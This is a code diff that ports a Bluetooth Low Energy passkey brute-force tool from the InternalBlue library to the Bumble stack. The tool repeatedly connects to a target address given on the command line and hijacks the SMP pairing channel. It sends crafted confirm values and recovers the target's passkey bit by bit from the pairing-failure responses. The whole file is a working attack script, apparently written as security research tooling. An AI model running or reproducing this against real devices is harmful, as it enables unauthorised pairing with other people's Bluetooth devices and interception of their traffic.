@@ -1,22 +1,48 @@
-import binascii
-import sys
 import time
+import asyncio
 import logging
+import argparse
+
+from bumble.device import Device, DeviceConfiguration
+from bumble.transport import open_transport
+from bumble.hci import Address
+from bumble.pairing import PairingDelegate
 
 from Crypto.Hash import CMAC
 from Crypto.Cipher import AES
 
-from internalblue.hcicore import HCICore
-from internalblue.cli import InternalBlueCLI
+SMP_CID = 0x0006
 
-import InternalBlueL2CAP
-from BTConnection import BluetoothConnection
+class Transport:
+    def __init__(self):
+        self.t = None
+        self.device = None
 
-SMP_CID = 0x06
+    async def init(self):
+        self.t = await open_transport("usb:0")
+        config = DeviceConfiguration()
+        config.keystore = "JsonKeyStore"
+        config.address = Address.generate_static_address()
+        config.name = "SMP Bruteforce"
+        self.device = Device.from_config_with_hci(config, self.t.source, self.t.sink)
+        self.device.le_enabled = True
+        # We need this to signal the other device we can actually input a passkey
+        self.device.config.io_capability = PairingDelegate.IoCapability.DISPLAY_OUTPUT_AND_KEYBOARD_INPUT
+        await self.device.power_on()
 
+    def register_raw_cid_handler(self, cid, cb):
+        def on_smp_pdu(handle, pdu):
+            if cb:
+                cb(pdu, cid)
+        # Set or replace handler with our own handler
+        self.device.l2cap_channel_manager.register_fixed_channel(cid, on_smp_pdu)
+
+    async def close(self):
+        await self.t.close()
+        await self.device.power_off()
 class SMP:
-    def __init__(self, l2cap, pin_bits):
-        self.l2cap = l2cap
+    def __init__(self, connection, pin_bits):
+        self.connection = connection
        
         # Pairing-related data
         self.pk_a = bytes.fromhex("4C746F9EFDBB5C49CCE450B682AE930441ABE3C63B850ACFDA94812DAC231268")
@@ -27,6 +53,7 @@ class SMP:
         self.bit_index = 0
         self.error_bit = None
         self.bits = pin_bits
+        self.error = False
 
         self._setup_logging()
 
@@ -42,14 +69,14 @@ class SMP:
 
     # the f4 function from the Bluetooth specification "LE Secure Connections Confirm Value Generation Function f4"
     def f4(self, u, v, x, z):
-        self.log.debug(f"f4({binascii.hexlify(u)}, {binascii.hexlify(v)}, {binascii.hexlify(x)}, {z})")
+        self.log.debug(f"f4({u.hex()}, {v.hex()}, {x.hex()}, {z})")
         c = CMAC.new(x, ciphermod=AES)
         c.update(u + v + z)
         return c.digest()
 
     def send(self, data):
-        self.log.debug(f"[SMP SEND]: {binascii.hexlify(data)}")
-        self.l2cap.sendData(data, SMP_CID)
+        self.log.debug(f"[SMP SEND]: {data.hex()}")
+        self.connection.send_l2cap_pdu(SMP_CID, data)
 
     def send_pk(self):
         # SMP Pairing Public Key Command (0x0c)
@@ -64,8 +91,8 @@ class SMP:
         self.send(b"\x03" + confirm_val[::-1])
         self.bit_index += 1
 
-    def listener(self, data, l2cap):
-        self.log.debug(f"[SMP RECV]: {binascii.hexlify(data)}")
+    def listener(self, data, cid):
+        self.log.debug(f"[SMP RECV]: {data.hex()}")
 
         if data == b"\x0b\x0d":
             self.log.info("Received SMP Security Request")
@@ -90,21 +117,21 @@ class SMP:
                 self.log.error(f"Error on bit at index {self.error_bit} = {self.bits[self.error_bit]}")
             else:
                 self.log.error(f"Received SMP Pairing Failed Command with unhandled error {hex(data[1])}")
+            self.error = True
         elif data[0] == 0x0c:
             self.log.info("Received SMP Pubkey Command")
             pk_x = data[1:33][::-1]
             pk_y = data[34:34+32][::-1]
-            self.log.debug(f"PK_X: {binascii.hexlify(pk_x)}\nPK_Y: {binascii.hexlify(pk_y)}")
+            self.log.debug(f"PK_X: {pk_x.hex()}\nPK_Y: {pk_y.hex()}")
             self.pk_b = pk_x
 
             self.send_confirm()
         else:
             self.log.info("Received unknown SMP Command {binascii.hexlify(data)}")
 
-
 class SMPBruteforce:
-    def __init__(self, internalblue, target, guess=[]):
-        self.internalblue = internalblue
+    def __init__(self, transport: Transport, target, guess=[]):
+        self.transport = transport 
         self.target = target
 
         # if there's no guess we just set all bits to 0
@@ -127,25 +154,22 @@ class SMPBruteforce:
             self.log.propagate = False
             self.log.setLevel(logging.INFO)
 
-    def bruteforce(self):
-        self.log.info(f"Starting SMP bruteforce against {binascii.hexlify(self.target)}")
+    async def bruteforce(self):
+        self.log.info(f"Starting SMP bruteforce against {self.target}")
         self.timer = time.time()
         while not self.finished:
             # connect to the target
-            connection = BluetoothConnection(self.internalblue, self.target, reconnect=0)
-            l2cap = InternalBlueL2CAP.L2CAPManager(connection)
-            smp = SMP(l2cap, self.pin_bits)
+            connection = await self.transport.device.connect(self.target)
+            if connection.handle:
+                smp = SMP(connection, self.pin_bits)
 
-            # listen to SMP CID
-            l2cap.registerCIDHandler(smp.listener, SMP_CID)
+                # listen to SMP CID
+                # this essentially overwrites Bumble's SMP handling
+                self.transport.register_raw_cid_handler(SMP_CID, smp.listener)
 
-            # set the Bluetooth technology [0->Classic, 1->BLE]
-            connection.connection_type = 1
-
-            if connection.connect():
                 # let SMP do its thing and obtain the failing index to flip the bit in our list
-                while connection.handle and not smp.bit_index >= 20:
-                    time.sleep(0.1)
+                while connection.handle and not smp.bit_index >= 20 and not smp.error:
+                    await asyncio.sleep(0.1)
 
                 if smp.error_bit != None:
                     if self.pin_bits[smp.error_bit] == 0:
@@ -159,10 +183,10 @@ class SMPBruteforce:
                     self.finished = True
                     break
 
-                connection.destroy()
+                await connection.disconnect()
                 self.attempts += 1
             else:
-                self.log.error(f"Unable to connect to device {binascii.hexlify(self.target)}. Trying again.")
+                self.log.error(f"Unable to connect to device {self.target.hex()}. Trying again.")
 
         self.log.info(f"Bruteforcing finished. Took about {(time.time() - self.timer):.2f} seconds and required {self.attempts} connection attempts")
         pin = self.pin_bits_as_int()
@@ -173,45 +197,32 @@ class SMPBruteforce:
         pin = 0
         for idx, val in enumerate(self.pin_bits):
             pin += val << idx
-
         return pin
 
-def bd_addr_to_bytes(addr_string):
-    addr = addr_string.replace(":", "")
-    return bytes.fromhex(addr)
+def parse_args():
+    parser = argparse.ArgumentParser(description="SMP Bruteforce")
+    parser.add_argument("-c", "--controller", default="usb:0", help="Bumble Bluetooth Controller")
+    parser.add_argument("--debug", action='store_true', help="Enable debug logging.")
+    parser.add_argument("--target", required=True, help="Device address to connect to")
+    
+    return parser.parse_args()
 
-def main():
-    # we need an internalblue HCI user_channel so that the kernel does
-    # not interfere with our SMP messages
-    internalblue = HCICore(log_level="debug", user_channel=True)
+async def main():
 
-    if len(sys.argv) != 2:
-        logging.critical(f"Usage: {sys.argv[0]} [BD_ADDR]")
-        logging.critical(f"\t[BD_ADDR] can be given as hexstring or with colons separating ever other byte.")
-        sys.exit(1)
+    args = parse_args()
 
-    target = sys.argv[1]
+    if args.debug:
+        logging.basicConfig(level='DEBUG')
 
-    # let user choose device if more than one is connected
-    devices = internalblue.device_list()
-    if len(devices) > 1:
-        # use internalblue's options function which replaces pwntool's
-        i = InternalBlueCLI.options("Please specify device: ", [d[2] for d in devices])
-        internalblue.interface = internalblue.device_list()[i][1]
-    else:
-        internalblue.interface = internalblue.device_list()[0][1]
+    target = args.target
 
-    if not internalblue.connect():
-        logging.critical("No connection to internalblue device.")
-        sys.exit(-1)
+    transport = Transport()
+    await transport.init()
 
-    # now we need the bd addr of the target
-    target = bd_addr_to_bytes(target)
+    smpbf = SMPBruteforce(transport, target)
+    await smpbf.bruteforce()
 
-    smpbf = SMPBruteforce(internalblue, target)
-    smpbf.bruteforce()
-
+    await transport.close()
 
 if __name__ == "__main__":
-    main()
-
+    asyncio.run(main())
